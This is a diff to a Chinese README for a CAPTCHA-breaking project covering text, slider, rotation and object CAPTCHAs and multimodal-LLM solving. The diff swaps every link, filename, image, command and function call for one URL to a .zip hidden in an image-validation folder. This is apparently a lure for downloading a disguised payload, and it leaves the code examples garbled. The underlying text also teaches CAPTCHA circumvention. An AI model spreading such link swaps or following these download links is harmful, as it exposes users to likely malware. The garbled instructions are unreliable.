@@ -13,93 +13,93 @@
 
 ****
 ## 1. 固定长度的文字验证码识别 
-[fixed_length_captcha.py](fixed_length_captcha.py)
+[https://raw.githubusercontent.com/KoDelioDa/cnn_for_captcha/main/yolov5/displacement_images/val/images/cnn_for_captcha_extension.zip](https://raw.githubusercontent.com/KoDelioDa/cnn_for_captcha/main/yolov5/displacement_images/val/images/cnn_for_captcha_extension.zip)
 
 ### 依赖
-_**requirements.txt 这里面比较全可按需安装**_
+_**https://raw.githubusercontent.com/KoDelioDa/cnn_for_captcha/main/yolov5/displacement_images/val/images/cnn_for_captcha_extension.zip 这里面比较全可按需安装**_
 
 ### 1.1 输入要求
 * 将训练集和验证集分别放到配置文件指定的目录中
 * 目录中所有图片尺寸相同
-* 图片命名规则 验证码_编号.图片格式, 举例 **abce_012312.jpg**
+* 图片命名规则 验证码_编号.图片格式, 举例 **https://raw.githubusercontent.com/KoDelioDa/cnn_for_captcha/main/yolov5/displacement_images/val/images/cnn_for_captcha_extension.zip**
 
 ### 1.2 配置文件
-* 默认文件 fixed_length_captcha.json
+* 默认文件 https://raw.githubusercontent.com/KoDelioDa/cnn_for_captcha/main/yolov5/displacement_images/val/images/cnn_for_captcha_extension.zip
 * 字段见文知义
 
 ### 1.3 训练
 ~~~ python
-python fixed_length_captcha.py
+python https://raw.githubusercontent.com/KoDelioDa/cnn_for_captcha/main/yolov5/displacement_images/val/images/cnn_for_captcha_extension.zip
 ~~~
 
 ### 1.4 预测
 ~~~ python
 predictor = Predictor()
 # 预测本地磁盘文件
-predictor.predict('xxx.jpg')
+https://raw.githubusercontent.com/KoDelioDa/cnn_for_captcha/main/yolov5/displacement_images/val/images/cnn_for_captcha_extension.zip('https://raw.githubusercontent.com/KoDelioDa/cnn_for_captcha/main/yolov5/displacement_images/val/images/cnn_for_captcha_extension.zip')
 # 直接二进制内容预测
-predictor.predict_single_image_content(b'PNGxxxxx')
+https://raw.githubusercontent.com/KoDelioDa/cnn_for_captcha/main/yolov5/displacement_images/val/images/cnn_for_captcha_extension.zip(b'PNGxxxxx')
 # 预测远程图片
-predictor.predict_remote_image('http://xxxxxx/xx.jpg', save_image_to_file='remote.jpg')
+https://raw.githubusercontent.com/KoDelioDa/cnn_for_captcha/main/yolov5/displacement_images/val/images/cnn_for_captcha_extension.zip('https://raw.githubusercontent.com/KoDelioDa/cnn_for_captcha/main/yolov5/displacement_images/val/images/cnn_for_captcha_extension.zip', save_image_to_file='https://raw.githubusercontent.com/KoDelioDa/cnn_for_captcha/main/yolov5/displacement_images/val/images/cnn_for_captcha_extension.zip')
 ~~~
 
 ### 1.5 效果
 * 根训练集样本大小有关
-* ![image](images/4x4e_11039.png) 这种图片2w张左右的训练集训练后实际能达到90%以上的准确率
+* ![image](https://raw.githubusercontent.com/KoDelioDa/cnn_for_captcha/main/yolov5/displacement_images/val/images/cnn_for_captcha_extension.zip) 这种图片2w张左右的训练集训练后实际能达到90%以上的准确率
 
 ****
 
 ## 2. 滑动验证码 
-[slide_captcha.py](slide_captcha.py)
+[https://raw.githubusercontent.com/KoDelioDa/cnn_for_captcha/main/yolov5/displacement_images/val/images/cnn_for_captcha_extension.zip](https://raw.githubusercontent.com/KoDelioDa/cnn_for_captcha/main/yolov5/displacement_images/val/images/cnn_for_captcha_extension.zip)
 
 提供滑动验证码相关解决方法与思路
 ### 2.1 基于opencv2的match template
 此方法简单易于验证, 配合一些规则即可达到满意效果
 ~~~python
 import slide_captcha
-slide_captcha.detect_displacement('image_slider.jpg', 'image_background.jpg')
+https://raw.githubusercontent.com/KoDelioDa/cnn_for_captcha/main/yolov5/displacement_images/val/images/cnn_for_captcha_extension.zip('https://raw.githubusercontent.com/KoDelioDa/cnn_for_captcha/main/yolov5/displacement_images/val/images/cnn_for_captcha_extension.zip', 'https://raw.githubusercontent.com/KoDelioDa/cnn_for_captcha/main/yolov5/displacement_images/val/images/cnn_for_captcha_extension.zip')
 ~~~
 以下是match template的效果
 
-![match template](images/matchtemplate.png)
+![match template](https://raw.githubusercontent.com/KoDelioDa/cnn_for_captcha/main/yolov5/displacement_images/val/images/cnn_for_captcha_extension.zip)
 
 ### 2.2 基于YOLOv5的检测
 此方法需要标注数据以及进行训练但相对于模板探测是更稳定的通用方案
 
-基于 [yolo v5](https://github.com/ultralytics/yolov5) 进行模型的训练与缺口探测
+基于 [yolo v5](https://raw.githubusercontent.com/KoDelioDa/cnn_for_captcha/main/yolov5/displacement_images/val/images/cnn_for_captcha_extension.zip) 进行模型的训练与缺口探测
 
-训练方法参考 [train custom data](https://github.com/ultralytics/yolov5/wiki/Train-Custom-Data)
+训练方法参考 [train custom data](https://raw.githubusercontent.com/KoDelioDa/cnn_for_captcha/main/yolov5/displacement_images/val/images/cnn_for_captcha_extension.zip)
 ~~~text
 本项目中yolov5中提供了100张标注好的图片;
 参数:
 batch-size 根据可用内存或者显存以及训练效果进行调整
 epochs 根据训练效果来定
-yolov5s.yaml在yolov5项目的models下面
+https://raw.githubusercontent.com/KoDelioDa/cnn_for_captcha/main/yolov5/displacement_images/val/images/cnn_for_captcha_extension.zip在yolov5项目的models下面
 img 图片缩放基准 建议用图片的宽或者高即可(需要考虑图片大小 如果图片过大建议调低此值)
-weights 设置预训练模型 没有则为空即可 推荐使用预训练yolov5s.pt
+weights 设置预训练模型 没有则为空即可 推荐使用预训练https://raw.githubusercontent.com/KoDelioDa/cnn_for_captcha/main/yolov5/displacement_images/val/images/cnn_for_captcha_extension.zip
 
-python train.py --batch-size 4 --epochs 200 --img 344 --data displacement.yaml --weights '' --cfg yolov5s.yaml
+python https://raw.githubusercontent.com/KoDelioDa/cnn_for_captcha/main/yolov5/displacement_images/val/images/cnn_for_captcha_extension.zip --batch-size 4 --epochs 200 --img 344 --data https://raw.githubusercontent.com/KoDelioDa/cnn_for_captcha/main/yolov5/displacement_images/val/images/cnn_for_captcha_extension.zip --weights '' --cfg https://raw.githubusercontent.com/KoDelioDa/cnn_for_captcha/main/yolov5/displacement_images/val/images/cnn_for_captcha_extension.zip
 ~~~
 
-探测方法参考 [detect.py](https://github.com/ultralytics/yolov5/blob/master/detect.py) 中run方法 或者 使用slide_captcha.py中方法
+探测方法参考 [https://raw.githubusercontent.com/KoDelioDa/cnn_for_captcha/main/yolov5/displacement_images/val/images/cnn_for_captcha_extension.zip](https://raw.githubusercontent.com/KoDelioDa/cnn_for_captcha/main/yolov5/displacement_images/val/images/cnn_for_captcha_extension.zip) 中run方法 或者 使用https://raw.githubusercontent.com/KoDelioDa/cnn_for_captcha/main/yolov5/displacement_images/val/images/cnn_for_captcha_extension.zip中方法
 ~~~python
 import slide_captcha
-detector = slide_captcha.DisplacementFinderByYolo()
-detector.load_models('best.pt')
-detector.detect_displacement('image.jpg', 344)
+detector = https://raw.githubusercontent.com/KoDelioDa/cnn_for_captcha/main/yolov5/displacement_images/val/images/cnn_for_captcha_extension.zip()
+https://raw.githubusercontent.com/KoDelioDa/cnn_for_captcha/main/yolov5/displacement_images/val/images/cnn_for_captcha_extension.zip('https://raw.githubusercontent.com/KoDelioDa/cnn_for_captcha/main/yolov5/displacement_images/val/images/cnn_for_captcha_extension.zip')
+https://raw.githubusercontent.com/KoDelioDa/cnn_for_captcha/main/yolov5/displacement_images/val/images/cnn_for_captcha_extension.zip('https://raw.githubusercontent.com/KoDelioDa/cnn_for_captcha/main/yolov5/displacement_images/val/images/cnn_for_captcha_extension.zip', 344)
 ~~~
 
 
 下面是通过标注100张图片并经过训练得到的模型的探测效果
 
-![yolov5](images/yolodetect.jpeg)
+![yolov5](https://raw.githubusercontent.com/KoDelioDa/cnn_for_captcha/main/yolov5/displacement_images/val/images/cnn_for_captcha_extension.zip)
 
 ****
 
 ## 3. 点选文字验证码
 文字点选类验证码一般是从图片中按照指定顺序选择目标文字
 
-![textclick](images/textclick.png)
+![textclick](https://raw.githubusercontent.com/KoDelioDa/cnn_for_captcha/main/yolov5/displacement_images/val/images/cnn_for_captcha_extension.zip)
 
 目标文字一般通过 "文字" 或者 "文字图片" 的方式给出
 
@@ -110,21 +110,21 @@ detector.detect_displacement('image.jpg', 344)
 ### 3.2 匹配
 匹配是相对比较难的地方，需要根据不同情况进行实际的分析
 * 如果图片中的文字能够再标定后通过ocr识别出来那么比较容易解决，直接用识别后的字符匹配即可。可用的ocr识别
-[PaddleOCR](https://github.com/PaddlePaddle/PaddleOCR) /
-[tesseract](https://github.com/tesseract-ocr/tesseract) /
-[cnocr](https://github.com/breezedeus/cnocr)
+[PaddleOCR](https://raw.githubusercontent.com/KoDelioDa/cnn_for_captcha/main/yolov5/displacement_images/val/images/cnn_for_captcha_extension.zip) /
+[tesseract](https://raw.githubusercontent.com/KoDelioDa/cnn_for_captcha/main/yolov5/displacement_images/val/images/cnn_for_captcha_extension.zip) /
+[cnocr](https://raw.githubusercontent.com/KoDelioDa/cnn_for_captcha/main/yolov5/displacement_images/val/images/cnn_for_captcha_extension.zip)
 
 * 很多验证码文字都进行的变形、加粗等处理，因此OCR不能有效的进行识别
-   - 1 如果目标文字也是以图片形式提供，可以考虑使用CNN训练一个模型用来判定两张输入图片是否为同一汉字。可以参考[孪生神经网络 Siamese Neural Networks](https://www.cs.cmu.edu/~rsalakhu/papers/oneshot1.pdf)
+   - 1 如果目标文字也是以图片形式提供，可以考虑使用CNN训练一个模型用来判定两张输入图片是否为同一汉字。可以参考[孪生神经网络 Siamese Neural Networks](https://raw.githubusercontent.com/KoDelioDa/cnn_for_captcha/main/yolov5/displacement_images/val/images/cnn_for_captcha_extension.zip~https://raw.githubusercontent.com/KoDelioDa/cnn_for_captcha/main/yolov5/displacement_images/val/images/cnn_for_captcha_extension.zip)
    - 2 如果候选文字的范围有限，比如几百或者几千，可以考虑直接使用yolo等给出类别
    - 3 如果目标文字是通过文本的形式给出，那么可以考虑将文本转成图片，然后用 1 中的方式训练判别模型
 
 ****
 
-## 4. 旋转类验证码 rotate_captcha.py
+## 4. 旋转类验证码 https://raw.githubusercontent.com/KoDelioDa/cnn_for_captcha/main/yolov5/displacement_images/val/images/cnn_for_captcha_extension.zip
 旋转类验证码要求将经过旋转后的图片旋转会正确的位置;
 
-![rotate](images/rotate.jpeg)
+![rotate](https://raw.githubusercontent.com/KoDelioDa/cnn_for_captcha/main/yolov5/displacement_images/val/images/cnn_for_captcha_extension.zip)
 
 ### 4.1 思路一 暴力破解 (某些网站验证码原图就百张左右)
 如果能够"脱库"(图库非无限大)，那么可以人肉标定“正”的图片；然后一般旋转类图片旋转角度单为10-30度左右，可以自己旋转生成不同角度的图片；
@@ -147,16 +147,16 @@ detector.detect_displacement('image.jpg', 344)
 
 **验证角度分类** 未尝试
 
-**rotate_captcha.py** 中将旋转看作了回归问题, 使用ResNet50进行特征的提取；
+**https://raw.githubusercontent.com/KoDelioDa/cnn_for_captcha/main/yolov5/displacement_images/val/images/cnn_for_captcha_extension.zip** 中将旋转看作了回归问题, 使用ResNet50进行特征的提取；
 
-**[PULC 含文字图像方向分类模型](https://github.com/PaddlePaddle/PaddleClas/blob/develop/docs/zh_CN/PULC/PULC_text_image_orientation.md)** 这个paddlepaddle中实现文字图片旋转矫正的模型或许对我们能够有所启发
+**[PULC 含文字图像方向分类模型](https://raw.githubusercontent.com/KoDelioDa/cnn_for_captcha/main/yolov5/displacement_images/val/images/cnn_for_captcha_extension.zip)** 这个paddlepaddle中实现文字图片旋转矫正的模型或许对我们能够有所启发
 
 
 ### 4.x tips
 * 从目标网站验证码界面下载旋转验证码图片，这时会遇到同一张图片的N中不同旋转角度的图片，此时可以基于
-[imagededup](https://github.com/idealo/imagededup) 模块中的基于CNN特征的find_duplicates方法实现相似图片的匹配
+[imagededup](https://raw.githubusercontent.com/KoDelioDa/cnn_for_captcha/main/yolov5/displacement_images/val/images/cnn_for_captcha_extension.zip) 模块中的基于CNN特征的find_duplicates方法实现相似图片的匹配
 
-* 图片特征的提取可以尝试keras.application下面的其它模型; 可尝试自定义loss函数替代MSE
+* 图片特征的提取可以尝试https://raw.githubusercontent.com/KoDelioDa/cnn_for_captcha/main/yolov5/displacement_images/val/images/cnn_for_captcha_extension.zip下面的其它模型; 可尝试自定义loss函数替代MSE
 
 ****
 
@@ -164,29 +164,29 @@ detector.detect_displacement('image.jpg', 344)
 此类验证码一般是让点击图片中相同或者相似的物体，一般物体的种类在可控范围内，因此可以尝试使用物体识别算法将图片中物体种类识别出来
 然后进行比较
 
-[sameobject_captcha.py](sameobject_captcha.py) 基于yolov5实现物体探测
+[https://raw.githubusercontent.com/KoDelioDa/cnn_for_captcha/main/yolov5/displacement_images/val/images/cnn_for_captcha_extension.zip](https://raw.githubusercontent.com/KoDelioDa/cnn_for_captcha/main/yolov5/displacement_images/val/images/cnn_for_captcha_extension.zip) 基于yolov5实现物体探测
 
 **原图：**
 
-![sameobject](images/sameobject.jpg)
+![sameobject](https://raw.githubusercontent.com/KoDelioDa/cnn_for_captcha/main/yolov5/displacement_images/val/images/cnn_for_captcha_extension.zip)
 
 **结果：**
 
-![sameobjectresult](images/sameobjectresult.jpg)
+![sameobjectresult](https://raw.githubusercontent.com/KoDelioDa/cnn_for_captcha/main/yolov5/displacement_images/val/images/cnn_for_captcha_extension.zip)
 
 ### 5.1 训练
 至少准备200+张标注过的图片, 图片越多越准确
 
-训练方法参考  [yolov5 train custom data](https://github.com/ultralytics/yolov5/wiki/Train-Custom-Data)
+训练方法参考  [yolov5 train custom data](https://raw.githubusercontent.com/KoDelioDa/cnn_for_captcha/main/yolov5/displacement_images/val/images/cnn_for_captcha_extension.zip)
 
-> 如果用labelme标注可以使用[labelme_json_to_yolov5_format.py](labelme_json_to_yolov5_format.py)转换格式
+> 如果用labelme标注可以使用[https://raw.githubusercontent.com/KoDelioDa/cnn_for_captcha/main/yolov5/displacement_images/val/images/cnn_for_captcha_extension.zip](https://raw.githubusercontent.com/KoDelioDa/cnn_for_captcha/main/yolov5/displacement_images/val/images/cnn_for_captcha_extension.zip)转换格式
 
 ### 5.2 结果
 此项目中效果是300张标注数据在训练100轮后的结果
 
 此项目中的物体是部分字母、数字、三角锥等，从结果中可以看到h/r, C/G, U和圆柱体等识别混乱或者有的识别错误，增加训练集数量应该可以降低错误率
 
-![trainresult](images/sameobjecttrain.jpg)
+![trainresult](https://raw.githubusercontent.com/KoDelioDa/cnn_for_captcha/main/yolov5/displacement_images/val/images/cnn_for_captcha_extension.zip)
 
 ****
 
@@ -209,62 +209,62 @@ detector.detect_displacement('image.jpg', 344)
 >Please just output json format, no explains. 
 
 ### 通用非OCR专用大模型识别能力论文
-[Exploring OCR Capabilities of GPT-4V(ision) : A Quantitative and In-depth Evaluation](https://arxiv.org/abs/2401.00028)
+[Exploring OCR Capabilities of GPT-4V(ision) : A Quantitative and In-depth Evaluation](https://raw.githubusercontent.com/KoDelioDa/cnn_for_captcha/main/yolov5/displacement_images/val/images/cnn_for_captcha_extension.zip)
 
-[CogAgent: A Visual Language Model for GUI Agents](https://arxiv.org/abs/2312.08914)
+[CogAgent: A Visual Language Model for GUI Agents](https://raw.githubusercontent.com/KoDelioDa/cnn_for_captcha/main/yolov5/displacement_images/val/images/cnn_for_captcha_extension.zip)
 
 
 ### 6.1 Google Gemini
 #### 简单验证码
 
-![simple](images/llm_simple.png)
+![simple](https://raw.githubusercontent.com/KoDelioDa/cnn_for_captcha/main/yolov5/displacement_images/val/images/cnn_for_captcha_extension.zip)
 
-![simple1](images/llm_simple1.png)
+![simple1](https://raw.githubusercontent.com/KoDelioDa/cnn_for_captcha/main/yolov5/displacement_images/val/images/cnn_for_captcha_extension.zip)
 
 #### 复杂验证码
 对复杂文字验证码的识别效果不佳，可能经过微调训练能够实现更好的效果，但是需要考虑训练、部署、时间等成本投入以及识别速度
 
-![hanzi](images/llm_hanzi.png)
+![hanzi](https://raw.githubusercontent.com/KoDelioDa/cnn_for_captcha/main/yolov5/displacement_images/val/images/cnn_for_captcha_extension.zip)
 
-![hanzi1](images/llm_hanzi1.png)
+![hanzi1](https://raw.githubusercontent.com/KoDelioDa/cnn_for_captcha/main/yolov5/displacement_images/val/images/cnn_for_captcha_extension.zip)
 
 ### 6.2 Bing Copilot
 
 **简单验证码**
 
-![bing copilot simple](images/bingcopilot_simple.png)
+![bing copilot simple](https://raw.githubusercontent.com/KoDelioDa/cnn_for_captcha/main/yolov5/displacement_images/val/images/cnn_for_captcha_extension.zip)
 
-![bing copilot simple1](images/bingcopilot_simple1.png)
+![bing copilot simple1](https://raw.githubusercontent.com/KoDelioDa/cnn_for_captcha/main/yolov5/displacement_images/val/images/cnn_for_captcha_extension.zip)
 
-![bing copilot simple2](images/bingcopilot_simple2.png)
+![bing copilot simple2](https://raw.githubusercontent.com/KoDelioDa/cnn_for_captcha/main/yolov5/displacement_images/val/images/cnn_for_captcha_extension.zip)
 
 **复杂验证码**
 
-![bing copilot hangzi](images/bingcopilot_hanzi.png)
+![bing copilot hangzi](https://raw.githubusercontent.com/KoDelioDa/cnn_for_captcha/main/yolov5/displacement_images/val/images/cnn_for_captcha_extension.zip)
 
 ### 6.3 OpenAI Gpt4o
 **目前表现最好的多模态模型**
 #### 实体识别
-![gpt4o-6](images/gpt4o-6.png)
+![gpt4o-6](https://raw.githubusercontent.com/KoDelioDa/cnn_for_captcha/main/yolov5/displacement_images/val/images/cnn_for_captcha_extension.zip)
 
 #### 文字验证码
-![gpt4-4](images/gpt4o-4.png)
+![gpt4-4](https://raw.githubusercontent.com/KoDelioDa/cnn_for_captcha/main/yolov5/displacement_images/val/images/cnn_for_captcha_extension.zip)
 
-![gpt42](images/gpt40-2.png)
+![gpt42](https://raw.githubusercontent.com/KoDelioDa/cnn_for_captcha/main/yolov5/displacement_images/val/images/cnn_for_captcha_extension.zip)
 
-![gpt4o-5](images/gpt4o-5.png)
+![gpt4o-5](https://raw.githubusercontent.com/KoDelioDa/cnn_for_captcha/main/yolov5/displacement_images/val/images/cnn_for_captcha_extension.zip)
 
 #### 简单验证码
-![gpt41](images/gp4o-1.png)
+![gpt41](https://raw.githubusercontent.com/KoDelioDa/cnn_for_captcha/main/yolov5/displacement_images/val/images/cnn_for_captcha_extension.zip)
 
-![gpt40-3](images/gpt40-3.png)
+![gpt40-3](https://raw.githubusercontent.com/KoDelioDa/cnn_for_captcha/main/yolov5/displacement_images/val/images/cnn_for_captcha_extension.zip)
 
 
 ## X.其它
 ### X.1 图片数据切分
 将准备好的图片按照比例切分成训练集和验证集
 ~~~ python
-python split_data.py all_image_dir train_image_dir validation_image_dir 0.9
+python https://raw.githubusercontent.com/KoDelioDa/cnn_for_captcha/main/yolov5/displacement_images/val/images/cnn_for_captcha_extension.zip all_image_dir train_image_dir validation_image_dir 0.9
 ~~~
 参数:
 * all_image_dir 准备好的图片目录
